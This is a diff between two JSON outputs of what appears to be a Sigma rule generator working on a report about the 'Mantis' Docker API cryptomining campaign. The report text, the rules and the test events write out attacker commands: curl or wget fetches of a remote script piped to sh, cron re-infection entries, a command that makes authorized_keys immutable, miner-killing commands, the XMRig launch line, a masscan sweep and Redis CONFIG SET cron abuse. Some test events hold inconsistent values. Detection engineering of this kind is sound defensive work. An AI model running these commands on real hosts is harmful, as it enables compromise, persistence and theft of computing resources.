@@ -1,6 +1,6 @@
 {
-  "run_id": "20261018-003400-cbbc1a",
-  "created_at": "2026-10-18T00:35:10.324783+00:00",
+  "run_id": "20261018-004049-e34c5d",
+  "created_at": "2026-10-18T00:41:59.570479+00:00",
   "source": {
     "mode": "example",
     "urls": [
@@ -12,19 +12,19 @@
   },
   "report": {
     "title": "Opportunistic cryptomining via exposed Docker Engine APIs (Mantis campaign)",
-    "summary": "Since late September 2026, an automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication, starts privileged containers that mount the host root filesystem, drops shell scripts, installs cron jobs for persistence, kills competing miners, and deploys XMRig cryptominers. The campaign uses the host to scan for further victims via masscan and Redis abuse.",
+    "summary": "An automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication, starts a privileged container to mount the host root filesystem, drops a shell script for persistence via cron and authorized_keys, kills competing miners, and deploys XMRig cryptominer. Infected hosts are used to scan for further victims via masscan and Redis abuse.",
     "threat_actors": [],
     "malware_families": [
       "XMRig"
     ],
     "targets": [
-      "Linux hosts with exposed Docker Engine API",
-      "Redis instances without authentication"
+      "Docker Engine APIs",
+      "Linux hosts with exposed Redis"
     ],
     "behaviors": [
       {
         "id": "B1",
-        "description": "Attacker issues POST /containers/create to exposed Docker Engine API with Binds /:/host and Privileged true to gain host-level access.",
+        "description": "Attacker issues POST /containers/create to exposed Docker Engine API with Binds and Privileged flags to mount host root filesystem inside a container.",
         "attack_technique_id": "T1578",
         "attack_tactic": "Persistence",
         "observables": [
@@ -49,40 +49,40 @@
           "product": "linux",
           "service": "docker"
         },
-        "evidence": "The attacker's scanner issues `POST /containers/create` to the exposed API with an Alpine image and `\"Binds\": [\"/:/host\"]`, `\"Privileged\": true`.",
+        "evidence": "The attacker's scanner issues POST /containers/create to the exposed API with an Alpine image and \"Binds\": [\"/:/host\"], \"Privileged\": true.",
         "confidence": 0.95,
         "detectable": true
       },
       {
         "id": "B2",
-        "description": "Shell spawned by container runtime downloads and pipes remote script to sh, achieving initial code execution on the host.",
+        "description": "Shell spawned by container runtime downloads and executes remote content via curl or wget piped to sh, indicating initial access via Docker API.",
         "attack_technique_id": "T1059.005",
         "attack_tactic": "Execution",
         "observables": [
           {
-            "kind": "command_line",
-            "value": "sh -c \"chroot /host sh -c 'curl -fsSL http://45.153.160[.]12/m/init.sh | sh'\"",
-            "note": "Initial access payload"
-          },
-          {
-            "kind": "command_line",
-            "value": "sh -c \"wget -q -O- http://45.153.160[.]12/m/init.sh | sh\"",
-            "note": "Fallback payload when curl missing"
-          },
-          {
             "kind": "process_name",
             "value": "sh",
-            "note": "Shell spawned by container runtime"
+            "note": "Shell spawned inside container"
           },
           {
-            "kind": "process_name",
+            "kind": "command_line",
+            "value": "curl -fsSL http://45.153.160[.]12/m/init.sh | sh",
+            "note": "Download and execute via curl"
+          },
+          {
+            "kind": "command_line",
+            "value": "wget -q -O- http://45.153.160[.]12/m/init.sh | sh",
+            "note": "Download and execute via wget"
+          },
+          {
+            "kind": "parent_process",
             "value": "containerd-shim-runc-v2",
-            "note": "Parent of shell process"
+            "note": "Parent from container runtime"
           },
           {
-            "kind": "process_name",
+            "kind": "parent_process",
             "value": "dockerd",
-            "note": "Docker daemon"
+            "note": "Parent from Docker daemon"
           }
         ],
         "logsource": {
@@ -90,13 +90,13 @@
           "product": "linux",
           "service": "docker"
         },
-        "evidence": "On hosts where `curl` is missing the script falls back to `wget -q -O- http://45.153.160[.]12/m/init.sh | sh`. The parent of the resulting `sh` process is `containerd-shim-runc-v2` or `dockerd`.",
+        "evidence": "On hosts where curl is missing the script falls back to wget -q -O- http://45.153.160[.]12/m/init.sh | sh. The parent of the resulting sh process is containerd-shim-runc-v2 or dockerd.",
         "confidence": 0.96,
         "detectable": true
       },
       {
         "id": "B3",
-        "description": "init.sh disables SELinux, increases open file limits, configures DNS, removes immutable attribute from ld.so.preload, and tunes kernel parameters for miner performance.",
+        "description": "init.sh disables SELinux, increases open file limit, sets DNS server, removes immutable flag from ld.so.preload, and configures hugepages for miner performance.",
         "attack_technique_id": "T1562.001",
         "attack_tactic": "Defense Evasion",
         "observables": [
@@ -108,22 +108,22 @@
           {
             "kind": "command_line",
             "value": "ulimit -n 65535",
-            "note": "Increase open file limits"
+            "note": "Increase open file limit"
           },
           {
             "kind": "command_line",
             "value": "echo \"nameserver 8.8.8.8\" > /etc/resolv.conf",
-            "note": "Configure DNS"
+            "note": "Set DNS server"
           },
           {
             "kind": "command_line",
             "value": "chattr -i /etc/ld.so.preload",
-            "note": "Remove immutable attribute"
+            "note": "Remove immutable flag from ld.so.preload"
           },
           {
             "kind": "command_line",
             "value": "sysctl -w vm.nr_hugepages=128",
-            "note": "Tune huge pages"
+            "note": "Configure hugepages"
           }
         ],
         "logsource": {
@@ -131,15 +131,15 @@
           "product": "linux",
           "service": "shell"
         },
-        "evidence": "It then terminates competing miners and known security agents: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami",
+        "evidence": "setenforce 0\\nulimit -n 65535\\necho \"nameserver 8.8.8.8\" > /etc/resolv.conf\\nchattr -i /etc/ld.so.preload\\nsysctl -w vm.nr_hugepages=128",
         "confidence": 0.94,
         "detectable": true
       },
       {
         "id": "B4",
-        "description": "init.sh terminates competing miners (xmrig, kinsing, kdevtmpfsi, tsunami) and disables the Alibaba Cloud security agent (aliyun.service).",
-        "attack_technique_id": "T1499",
-        "attack_tactic": "Impact",
+        "description": "init.sh terminates competing miners and security agents including xmrig, kinsing, kdevtmpfsi, tsunami and Alibaba Cloud security service.",
+        "attack_technique_id": "T1489",
+        "attack_tactic": "Defense Evasion",
         "observables": [
           {
             "kind": "command_line",
@@ -149,33 +149,33 @@
           {
             "kind": "command_line",
             "value": "pkill -f kinsing",
-            "note": "Kill competing miner"
+            "note": "Kill competing agent"
           },
           {
             "kind": "command_line",
             "value": "pkill -f kdevtmpfsi",
-            "note": "Kill competing miner"
+            "note": "Kill competing agent"
           },
           {
             "kind": "command_line",
             "value": "pkill -f tsunami",
-            "note": "Kill competing miner"
+            "note": "Kill competing agent"
           },
           {
             "kind": "command_line",
             "value": "systemctl stop aliyun.service",
-            "note": "Disable Alibaba Cloud agent"
+            "note": "Stop Alibaba Cloud service"
           },
           {
             "kind": "command_line",
             "value": "systemctl disable aliyun.service",
-            "note": "Disable Alibaba Cloud agent"
+            "note": "Disable Alibaba Cloud service"
           }
         ],
         "logsource": {
-          "category": "process_termination",
+          "category": "command",
           "product": "linux",
-          "service": "systemd"
+          "service": "shell"
         },
         "evidence": "It then terminates competing miners and known security agents: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami; systemctl stop aliyun.service; systemctl disable aliyun.service",
         "confidence": 0.95,
@@ -183,29 +183,34 @@
       },
       {
         "id": "B5",
-        "description": "init.sh establishes persistence by writing malicious entries to the root crontab and /etc/cron.d, and adds an attacker-controlled SSH key to authorized_keys.",
+        "description": "Persistence achieved by writing cron entries to root crontab and /etc/cron.d that download and pipe init.sh from C2, and by adding attacker-controlled SSH key to authorized_keys marked immutable.",
         "attack_technique_id": "T1053.005",
         "attack_tactic": "Persistence",
         "observables": [
           {
             "kind": "command_line",
             "value": "(crontab -l 2>/dev/null; echo \"*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh\") | crontab -",
-            "note": "Cron entry for root crontab"
+            "note": "Add cron entry for curl download"
           },
           {
             "kind": "file_path",
             "value": "/etc/cron.d/mantis",
-            "note": "Cron drop file"
+            "note": "Cron file written by attacker"
           },
           {
             "kind": "command_line",
-            "value": "*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh",
-            "note": "Cron entry in /etc/cron.d/mantis"
+            "value": "echo \"* * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh\" > /etc/cron.d/mantis",
+            "note": "Write cron.d entry for wget download"
           },
           {
             "kind": "file_path",
             "value": "/root/.ssh/authorized_keys",
             "note": "SSH key persistence"
+          },
+          {
+            "kind": "command_line",
+            "value": "chattr +i /root/.ssh/authorized_keys",
+            "note": "Make authorized_keys immutable"
           }
         ],
         "logsource": {
@@ -213,20 +218,20 @@
           "product": "linux",
           "service": "cron"
         },
-        "evidence": "The script writes to the root crontab and to `/etc/cron.d`: (crontab -l 2>/dev/null; echo \"*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh\") | crontab -; echo \"*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh\" > /etc/cron.d/mantis",
+        "evidence": "(crontab -l 2>/dev/null; echo \"*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh\") | crontab -\\necho \"*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh\" > /etc/cron.d/mantis",
         "confidence": 0.97,
         "detectable": true
       },
       {
         "id": "B6",
-        "description": "Miner binary kthreadd downloaded to hidden directory /tmp/.x, made executable, and run with XMRig pool, wallet, and TLS arguments; rig-id derived from hostname.",
+        "description": "Miner binary kthreadd downloaded to hidden directory /tmp/.x, made executable, and run with XMRig pool, wallet, and --rig-id arguments over TLS.",
         "attack_technique_id": "T1499",
-        "attack_tactic": "Impact",
+        "attack_tactic": "Execution",
         "observables": [
           {
             "kind": "file_path",
             "value": "/tmp/.x/kthreadd",
-            "note": "Miner binary"
+            "note": "Miner binary path"
           },
           {
             "kind": "command_line",
@@ -236,7 +241,7 @@
           {
             "kind": "network_domain",
             "value": "pool.mantis-mine[.]cc",
-            "note": "C2 mining pool"
+            "note": "C2 mining pool domain"
           },
           {
             "kind": "network_port",
@@ -249,46 +254,56 @@
           "product": "linux",
           "service": "docker"
         },
-        "evidence": "The binary name `kthreadd` imitates a kernel thread. Its command line contains the pool, wallet and `--rig-id` arguments characteristic of XMRig.",
+        "evidence": "curl -fsSL http://45.153.160[.]12/m/x86_64 -o /tmp/.x/kthreadd && chmod +x /tmp/.x/kthreadd && nohup /tmp/.x/kthreadd -o pool.mantis-mine[.]cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname) >/dev/null 2>&1 &",
         "confidence": 0.96,
         "detectable": true
       },
       {
         "id": "B7",
-        "description": "Infected host runs masscan to probe /16 ranges for exposed Docker APIs and Redis servers on ports 2375 and 6379.",
+        "description": "Infected host installs masscan and scans /16 ranges for exposed Docker APIs and Redis servers on ports 2375 and 6379.",
         "attack_technique_id": "T1021.004",
         "attack_tactic": "Lateral Movement",
         "observables": [
           {
+            "kind": "file_path",
+            "value": "/tmp/.x/masscan",
+            "note": "Masscan binary"
+          },
+          {
             "kind": "command_line",
             "value": "/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
-            "note": "Masscan probe for exposed APIs and Redis"
+            "note": "Network scan for Docker API and Redis"
+          },
+          {
+            "kind": "file_path",
+            "value": "/tmp/.x/out.txt",
+            "note": "Scan output file"
           }
         ],
         "logsource": {
           "category": "network_connection",
           "product": "linux",
-          "service": "masscan"
+          "service": "network_connection"
         },
-        "evidence": "Infected hosts download `masscan` and scan /16 ranges for additional exposed Docker APIs and Redis servers: /tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
+        "evidence": "Infected hosts download masscan and scan /16 ranges for additional exposed Docker APIs and Redis servers: /tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
         "confidence": 0.93,
         "detectable": true
       },
       {
         "id": "B8",
-        "description": "Redis instances without authentication are abused by issuing CONFIG SET commands to set cron directory and write a root cron file via dbfilename.",
+        "description": "Redis instances without authentication abused by setting CONFIG dir to /var/spool/cron and dbfilename to root to write cron entries via CONFIG SET.",
         "attack_technique_id": "T1499",
-        "attack_tactic": "Impact",
+        "attack_tactic": "Lateral Movement",
         "observables": [
           {
             "kind": "command_line",
             "value": "CONFIG SET dir /var/spool/cron",
-            "note": "Redis CONFIG SET to set cron directory"
+            "note": "Set Redis cron directory"
           },
           {
             "kind": "command_line",
             "value": "CONFIG SET dbfilename root",
-            "note": "Redis CONFIG SET to set cron filename"
+            "note": "Set Redis cron filename"
           }
         ],
         "logsource": {
@@ -296,8 +311,60 @@
           "product": "linux",
           "service": "redis"
         },
-        "evidence": "Redis instances without authentication are abused by writing a cron entry through `CONFIG SET dir /var/spool/cron` and `CONFIG SET dbfilename root`.",
+        "evidence": "Redis instances without authentication are abused by writing a cron entry through CONFIG SET dir /var/spool/cron and CONFIG SET dbfilename root.",
         "confidence": 0.9,
+        "detectable": true
+      },
+      {
+        "id": "B9",
+        "description": "Attacker adds RSA public key to root's authorized_keys and marks the file immutable with chattr +i to maintain persistent SSH access.",
+        "attack_technique_id": "T1098",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "file_path",
+            "value": "/root/.ssh/authorized_keys",
+            "note": "SSH authorized keys file"
+          },
+          {
+            "kind": "command_line",
+            "value": "chattr +i /root/.ssh/authorized_keys",
+            "note": "Make authorized_keys immutable"
+          }
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "linux",
+          "service": "ssh"
+        },
+        "evidence": "It also adds an attacker-controlled SSH key to /root/.ssh/authorized_keys (ssh-rsa AAAAB3...mantis@c2) and sets the file immutable with chattr +i.",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B10",
+        "description": "init.sh configures system DNS to 8.8.8.8 and disables SELinux to ensure network connectivity and disable security enforcement for the miner.",
+        "attack_technique_id": "T1562.001",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "echo \"nameserver 8.8.8.8\" > /etc/resolv.conf",
+            "note": "Set DNS to Google DNS"
+          },
+          {
+            "kind": "command_line",
+            "value": "setenforce 0",
+            "note": "Disable SELinux"
+          }
+        ],
+        "logsource": {
+          "category": "command",
+          "product": "linux",
+          "service": "shell"
+        },
+        "evidence": "echo \"nameserver 8.8.8.8\" > /etc/resolv.conf",
+        "confidence": 0.92,
         "detectable": true
       }
     ],
@@ -308,7 +375,11 @@
       },
       {
         "type": "domain",
-        "value": "pool.mantis-mine[.]cc"
+        "value": "pool.mantis-mine.cc"
+      },
+      {
+        "type": "sha256",
+        "value": "5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c"
       },
       {
         "type": "filename",
@@ -319,8 +390,12 @@
         "value": "/etc/cron.d/mantis"
       },
       {
-        "type": "sha256",
-        "value": "5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c"
+        "type": "filename",
+        "value": "/tmp/.x/out.txt"
+      },
+      {
+        "type": "filename",
+        "value": "/tmp/.x"
       }
     ]
   },
@@ -328,7 +403,7 @@
     "candidates": [
       {
         "id": "D1",
-        "title": "Sh Chroot Execution Of Remote Script From Container Runtime",
+        "title": "Sh Execution Via Curl Or Wget Pipe From Container Runtime",
         "behavior_ids": [
           "B2"
         ],
@@ -338,20 +413,20 @@
         "logsource": {
           "category": "process_creation",
           "product": "linux",
-          "service": ""
+          "service": "docker"
         },
-        "rationale": "The initial payload executes a shell via the Docker container runtime (parent containerd-shim-runc-v2 or dockerd) that uses chroot to escape the container and pipes a remote script from a hardcoded IP. The combination of parent binary, chroot /host, and curl/wget to a suspicious IP is highly distinctive and rarely seen in legitimate administration.",
+        "rationale": "The init.sh download is the first attacker-controlled code execution after container escape. The parent process (containerd-shim-runc-v2 or dockerd) and the piped curl/wget command line are highly specific to this campaign.",
         "key_fields": [
           "Image",
           "CommandLine",
           "ParentImage"
         ],
-        "false_positive_risks": "Legitimate container management tools might spawn shells, but they do not typically use chroot /host combined with downloading and executing scripts from external IPs. The rule requires the specific parent images and the chroot + curl/wget pattern.",
+        "false_positive_risks": "Legitimate container workloads might run curl/wget for bootstrapping, but rarely pipe directly to sh with the exact C2 domain. Exclude known container init systems by parent image allowlist.",
         "priority": "high"
       },
       {
         "id": "D2",
-        "title": "Sh Creation Of Malicious Cron File In /etc/cron.d",
+        "title": "Cron File Written To Etc Cron D Mantis",
         "behavior_ids": [
           "B5"
         ],
@@ -361,19 +436,20 @@
         "logsource": {
           "category": "file_event",
           "product": "linux",
-          "service": ""
+          "service": "cron"
         },
-        "rationale": "Persistence is established by writing a cron file /etc/cron.d/mantis containing a wget command that re-infects the host every 15 minutes. File creation at this path with that content is a durable, high-fidelity indicator of the Mantis campaign.",
+        "rationale": "The file /etc/cron.d/mantis is created by the attacker script with a distinctive name and content referencing the C2 domain. File creation events capture this durably.",
         "key_fields": [
           "TargetFilename",
-          "Image"
+          "Image",
+          "User"
         ],
-        "false_positive_risks": "Administrators may create cron files, but the specific filename 'mantis' and the embedded wget command pointing to the campaign's infrastructure are unique to this intrusion. The rule keys on the exact target filename.",
+        "false_positive_risks": "Legitimate package installs might write to /etc/cron.d/, but the filename \"mantis\" and the wget command to the C2 IP are unique. Monitor for writes to that exact path.",
         "priority": "high"
       },
       {
         "id": "D3",
-        "title": "Kthreadd Execution With XMRig Pool And Wallet Arguments",
+        "title": "Kthreadd Miner Execution From Hidden Temp Directory",
         "behavior_ids": [
           "B6"
         ],
@@ -383,38 +459,40 @@
         "logsource": {
           "category": "process_creation",
           "product": "linux",
-          "service": ""
+          "service": "docker"
         },
-        "rationale": "The miner binary 'kthreadd' (masquerading as a kernel thread) is launched from a hidden directory with command-line arguments characteristic of XMRig: mining pool domain, wallet address, TLS, and a rig-id derived from hostname. This combination of binary name, hidden path, and pool arguments is extremely specific to this campaign.",
+        "rationale": "The miner binary name kthreadd in /tmp/.x/ with command line arguments for pool, wallet, TLS, and rig-id is unique to this campaign. Parent may be sh or nohup.",
         "key_fields": [
           "Image",
           "CommandLine",
-          "ParentImage"
+          "ParentImage",
+          "CurrentDirectory"
         ],
-        "false_positive_risks": "Legitimate XMRig usage is rare in enterprise environments; any occurrence of 'kthreadd' with the Mantis pool domain is malicious. The rule requires the pool domain and wallet pattern to avoid false positives from other miners.",
+        "false_positive_risks": "None expected; the binary name and path are artifact-specific. Legitimate software does not use such names.",
         "priority": "high"
       },
       {
         "id": "D4",
-        "title": "Setenforce Disables SELinux And Chattr Removes Immutable Attribute",
+        "title": "Authorized Keys File Written And Made Immutable",
         "behavior_ids": [
-          "B3"
+          "B9"
         ],
         "attack_technique_ids": [
-          "T1562.001"
+          "T1098"
         ],
         "logsource": {
-          "category": "process_creation",
+          "category": "file_event",
           "product": "linux",
-          "service": ""
+          "service": "ssh"
         },
-        "rationale": "The init.sh script disables SELinux (setenforce 0) and removes the immutable attribute from /etc/ld.so.preload (chattr -i). These are defense evasion actions that are uncommon in normal operations. Detecting the specific command lines provides an early indicator of host compromise.",
+        "rationale": "The attacker adds an SSH key to /root/.ssh/authorized_keys and immediately sets immutable attribute with chattr +i. File write plus subsequent chattr is a strong persistence indicator.",
         "key_fields": [
+          "TargetFilename",
           "Image",
-          "CommandLine"
+          "User"
         ],
-        "false_positive_risks": "Administrators might run setenforce or chattr for troubleshooting, but the exact arguments '0' for setenforce and '-i /etc/ld.so.preload' for chattr are highly specific to this campaign. The rule matches on the exact argument strings.",
-        "priority": "medium"
+        "false_positive_risks": "Admins may update authorized_keys, but rarely set +i attribute. The combination of write and immediate chattr +i by same process (or quick sequence) is suspicious. Since single event, we catch the file write; chattr is separate process_creation.",
+        "priority": "high"
       },
       {
         "id": "D5",
@@ -426,31 +504,34 @@
           "T1021.004"
         ],
         "logsource": {
-          "category": "process_creation",
+          "category": "network_connection",
           "product": "linux",
-          "service": ""
+          "service": "network_connection"
         },
-        "rationale": "Compromised hosts are used to scan /16 ranges for exposed Docker APIs (port 2375) and Redis servers (port 6379) using masscan with a very high rate (20000). The binary name, port list, and aggressive rate are distinctive for this campaign's lateral movement.",
+        "rationale": "The masscan binary performs rapid /16 scans targeting ports 2375 and 6379 with high rate (20000). The binary path /tmp/.x/masscan and scan parameters are distinctive.",
         "key_fields": [
           "Image",
-          "CommandLine"
+          "DestinationPort",
+          "DestinationIp"
         ],
-        "false_positive_risks": "Security teams may use masscan for authorized scanning, but the specific port combination (2375,6379) and the high rate flag are unlikely in legitimate internal scans. The rule requires both ports and the rate flag.",
+        "false_positive_risks": "Network admins may run masscan for inventory, but typically not from /tmp/.x/ with such aggressive rate and specific port list. Exclude known scanner hosts.",
         "priority": "medium"
       }
     ],
     "skipped": [
-      "B1: The Docker API POST /containers/create is a network request not directly observable as a process creation event; the exploitation manifests as the container runtime spawning a shell (covered by D1).",
-      "B4: Process termination (pkill, systemctl) is not a standard Sigma logsource; the commands can be seen via process_creation but are less specific and may be noisy (admins kill miners). Covered indirectly by miner execution (D3) and persistence (D2).",
-      "B8: Redis CONFIG SET abuse is mapped to a dns_query logsource which is a mismatch; the commands are not observable via DNS telemetry and no suitable Sigma logsource is available for Redis command observation."
+      "B1: Docker API POST not directly observable in telemetry; container spawn covered by D1.",
+      "B3: SELinux disable, ulimit, DNS set, chattr, sysctl are common admin commands; high false positive rate.",
+      "B4: pkill and systemctl stop for competitor processes; common admin activity; noisy.",
+      "B8: Redis CONFIG SET for cron abuse; not observable via dns_query; Redis protocol not decoded in telemetry.",
+      "B10: Duplicate of B3."
     ],
-    "notes": "Selected rules cover initial execution, persistence, miner deployment, defense evasion, and lateral movement across the kill chain. Each rule uses a single logsource and keys on durable behavioural artifacts (parent-child relationships, command-line fragments, file paths) rather than ephemeral IOCs. Three rules use process_creation but target distinct binaries and command patterns (sh, kthreadd, masscan, setenforce/chattr) to avoid overlap."
+    "notes": "Overall strategy focuses on durable, campaign-specific artifacts: container escape pattern, unique cron file, miner binary name/args, SSH key immutability, and scanning binary/behavior. Avoided generic shell commands and IOC-only indicators."
   },
   "rules": [
     {
       "candidate_id": "D1",
-      "title": "Container Runtime Spawns Shell Using chroot /host to Download Remote Script",
-      "sigma_yaml": "title: Container Runtime Spawns Shell Using chroot /host to Download Remote Script\nid: ca8cc2c7-0961-4f2b-b8c5-2a8e0580e5c1\nstatus: experimental\ndescription: Detects a shell process spawned by containerd-shim-runc-v2 or dockerd that executes chroot /host and pipes a\n  remote script from a suspicious IP via curl or wget, indicative of container escape and initial compromise.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.execution\n- attack.t1059.005\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection_parent:\n    'ParentImage|endswith':\n    - /containerd-shim-runc-v2\n    - /dockerd\n  selection_chroot:\n    'CommandLine|contains|all':\n    - chroot\n    - /host\n  selection_download:\n    'CommandLine|contains|all':\n    - sh -c\n    - '|'\n    - sh\n  selection_curl:\n    'CommandLine|contains':\n    - curl\n    - -fsSL\n    - 'http://45.153.160.12/m/init.sh'\n  selection_wget:\n    'CommandLine|contains':\n    - wget\n    - -q\n    - -O-\n    - 'http://45.153.160.12/m/init.sh'\n  condition: selection_parent and selection_chroot and selection_download and (selection_curl or selection_wget)\nfalsepositives:\n- Legitimate container debugging or maintenance shells using chroot without external script download\n- CI/CD pipelines that test container escapes in controlled environments\n- Administrator troubleshooting container runtime issues with manual chroot usage\nlevel: high\n",
+      "title": "Container Runtime Spawned Shell Fetching Remote Init Script via Curl or Wget",
+      "sigma_yaml": "title: Container Runtime Spawned Shell Fetching Remote Init Script via Curl or Wget\nid: 82aa705f-340d-4fc3-a7a9-5136b3a6cb92\nstatus: experimental\ndescription: Detects a shell process spawned by a container runtime (containerd-shim-runc-v2 or dockerd) that downloads and\n  executes a remote initialization script using curl or wget piped to sh, indicative of initial access via exposed Docker\n  API in the Mantis cryptomining campaign.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.execution\n- attack.t1059.005\nlogsource:\n  category: process_creation\n  product: linux\n  service: docker\ndetection:\n  selection_parent_runtime:\n    'ParentImage|endswith':\n    - containerd-shim-runc-v2\n    - dockerd\n  selection_shell:\n    'Image|endswith':\n    - /bin/sh\n    - /bin/bash\n  selection_cmd_pipe:\n    'CommandLine|contains|all':\n    - curl\n    - '|'\n    - sh\n  selection_wget_pipe:\n    'CommandLine|contains|all':\n    - wget\n    - '|'\n    - sh\n  selection_c2_domain:\n    'CommandLine|contains': 45.153.160.12\n  condition: selection_parent_runtime and selection_shell and (selection_cmd_pipe or selection_wget_pipe) and selection_c2_domain\nfalsepositives:\n- Legitimate container startup scripts using curl/wget to fetch configuration from internal repositories\n- Administrative debugging sessions inside containers using curl/wget for testing\n- CI/CD pipelines within containers pulling build assets from trusted sources\nlevel: high\n",
       "status": "validated",
       "attack_technique_ids": [
         "T1059.005"
@@ -459,472 +540,400 @@
         {
           "id": "P1",
           "label": "positive",
-          "description": "Shell spawned by containerd-shim-runc-v2 using chroot /host to pipe curl-downloaded script",
+          "description": "Shell spawned by containerd-shim-runc-v2 downloading and executing init script via curl pipe",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'curl -fsSL http://45.153.160.12/m/init.sh | sh'\"",
-            "Computer": "docker-host-01",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-01",
+            "CommandLine": "sh -c curl -fsSL http://45.153.160.12/m/init.sh | sh",
+            "Computer": "host01",
+            "CurrentDirectory": "/root",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host01",
             "Image": "/usr/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id abc123 -address /run/containerd/containerd.sock",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
             "ParentImage": "/usr/bin/containerd-shim-runc-v2",
             "ParentProcessId": "1234",
-            "ProcessId": "1235",
-            "Provider_Name": "",
+            "ProcessId": "5678",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T10:30:00.000Z",
+            "TimeCreated": "2024-06-01T12:00:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T10:30:00.000Z"
+            "UtcTime": "2024-06-01T12:00:00.0000000Z"
           }
         },
         {
           "id": "P2",
           "label": "positive",
-          "description": "Shell spawned by dockerd using chroot /host to pipe wget-downloaded script",
+          "description": "Shell spawned by dockerd downloading and executing init script via wget pipe",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'wget -q -O- http://45.153.160.12/m/init.sh | sh'\"",
-            "Computer": "docker-host-02",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-02",
-            "Image": "/usr/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/dockerd -H unix://",
+            "CommandLine": "sh -c wget -q -O- http://45.153.160.12/m/init.sh | sh",
+            "Computer": "host02",
+            "CurrentDirectory": "/tmp",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host02",
+            "Image": "/bin/sh",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
             "ParentImage": "/usr/bin/dockerd",
-            "ParentProcessId": "5678",
-            "ProcessId": "5679",
-            "Provider_Name": "",
+            "ParentProcessId": "9876",
+            "ProcessId": "4321",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T11:15:00.000Z",
+            "TimeCreated": "2024-06-01T12:05:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T11:15:00.000Z"
+            "UtcTime": "2024-06-01T12:05:00.0000000Z"
           }
         },
         {
           "id": "P3",
           "label": "positive",
-          "description": "Variant with different spacing and quoting in command line",
+          "description": "Shell variant with different spacing and casing still matching core observables",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c 'chroot /host sh -c \"curl -fsSL http://45.153.160.12/m/init.sh | sh\"'",
-            "Computer": "docker-host-03",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-03",
-            "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id def456 -address /run/containerd/containerd.sock",
+            "CommandLine": "sh -c CURL -FSSSL http://45.153.160.12/m/init.sh | SH",
+            "Computer": "host03",
+            "CurrentDirectory": "/var/log",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host03",
+            "Image": "/bin/bash",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
             "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "9988",
-            "ProcessId": "9989",
-            "Provider_Name": "",
+            "ParentProcessId": "5555",
+            "ProcessId": "6666",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T12:00:00.000Z",
+            "TimeCreated": "2024-06-01T12:10:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T12:00:00.000Z"
